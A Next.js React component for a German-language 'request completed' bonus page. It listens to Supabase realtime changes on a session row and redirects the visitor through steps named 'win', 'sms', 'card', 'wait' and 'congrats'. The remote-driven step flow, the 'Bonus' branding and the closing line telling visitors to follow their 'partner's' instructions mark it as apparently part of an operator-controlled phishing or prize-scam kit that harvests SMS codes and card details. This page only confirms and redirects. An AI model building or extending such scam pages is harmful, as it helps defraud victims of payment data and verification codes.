"use client";

import { useEffect, useState } from "react";
import { usePathname, useRouter } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";
import type { SessionStep } from "@/types/session";

type Props = {
  sessionId?: string;
};

export function CongratulationsClient({ sessionId = "" }: Props) {
  const router = useRouter();
  const pathname = usePathname();
  const [effectiveSessionId, setEffectiveSessionId] = useState(sessionId);

  useEffect(() => {
    if (sessionId) return;
    try {
      const cached = localStorage.getItem("activeSessionId");
      if (cached) setEffectiveSessionId(cached);
    } catch {
      /* ignore */
    }
  }, [sessionId]);

  useEffect(() => {
    if (!effectiveSessionId) return;
    const supabase = createBrowserSupabaseClient();
    if (!supabase) return;
    const allowedSteps: SessionStep[] = ["win", "sms", "card", "wait", "congrats"];

    const applyStep = (nextStep?: SessionStep) => {
      if (!nextStep) return;
      if (!allowedSteps.includes(nextStep)) return;
      if (nextStep === "congrats" && pathname.startsWith("/congratulations")) return;
      router.push(stepToPath(nextStep, effectiveSessionId));
    };

    const channel = supabase
      .channel(`congrats-session:${effectiveSessionId}`)
      .on(
        "postgres_changes",
        { event: "UPDATE", schema: "public", table: "sessions", filter: `id=eq.${effectiveSessionId}` },
        (payload) => {
          const next = payload.new as { current_step?: SessionStep };
          applyStep(next.current_step);
        },
      )
      .subscribe();

    return () => {
      void supabase.removeChannel(channel);
    };
  }, [effectiveSessionId, pathname, router]);

  return (
    <div className="pak-page-shell">
      <div className="pak-form-card fade-in relative z-10 mx-auto w-full max-w-[760px] overflow-hidden">
        <div className="pak-form-inner px-6 pb-8 pt-8 text-center sm:px-10 sm:pb-10 sm:pt-10">
          <div className="mx-auto mb-6 flex w-full max-w-[560px] items-start justify-between gap-4 text-left">
            <div>
              <h2 className="pak-form-title max-w-[12ch]">Anfrage abgeschlossen</h2>
              <p className="pak-form-subtitle mt-3 max-w-[30rem]">
                Ihre Bestätigung wurde erfolgreich akzeptiert.
              </p>
            </div>
            <img
              src="/form-assets/logo-form.svg"
              alt="Bonus"
              className="pak-form-brand-logo shrink-0"
            />
          </div>

          <div className="mx-auto flex w-full max-w-[560px] flex-col items-center rounded-[28px] border border-[#ffd95c]/30 bg-[radial-gradient(circle_at_top,rgba(255,213,0,0.16),transparent_55%),linear-gradient(180deg,rgba(18,18,16,0.96),rgba(10,10,9,0.98))] px-6 py-8 shadow-[inset_0_1px_0_rgba(255,240,160,0.08)]">
            <div className="relative mb-6 flex h-28 w-28 items-center justify-center">
              <div className="absolute inset-0 rounded-full border border-[#ffd95c]/20" />
              <div className="absolute inset-[12px] rounded-full border border-[#ffd500]/20" />
              <div className="absolute inset-0 rounded-full bg-[#ffd500]/8 blur-xl" />
              <div className="relative grid h-20 w-20 place-items-center rounded-full border border-[#ffe98c]/40 bg-[linear-gradient(180deg,#ffe654_0%,#f4cb00_100%)] shadow-[0_0_28px_rgba(255,214,10,0.25)]">
                <svg
                  aria-hidden
                  viewBox="0 0 24 24"
                  className="size-10 text-[#121212]"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2.3"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                >
                  <path d="M20 6 9 17l-5-5" />
                </svg>
              </div>
            </div>

            <p className="max-w-[34rem] text-[17px] font-semibold leading-8 text-white sm:text-[19px]">
              Herzlichen Glückwunsch! Ihre Anfrage wurde erfolgreich abgeschlossen. Folgen Sie den Anweisungen Ihres Partners, um fortzufahren.
            </p>

            <div className="mt-8 pak-form-security justify-center text-center">
              <svg className="h-8 w-8 shrink-0 text-[#ffd500]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
                <path d="M12 15v2m-6 4h12a2 2 0 0 0 2-2v-6a2 2 0 0 0-2-2H6a2 2 0 0 0-2 2v6a2 2 0 0 0 2 2Zm10-10V7a4 4 0 0 0-8 0v4h8Z" strokeLinecap="round" strokeLinejoin="round" />
              </svg>
              <span>Bestätigung sicher gespeichert</span>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
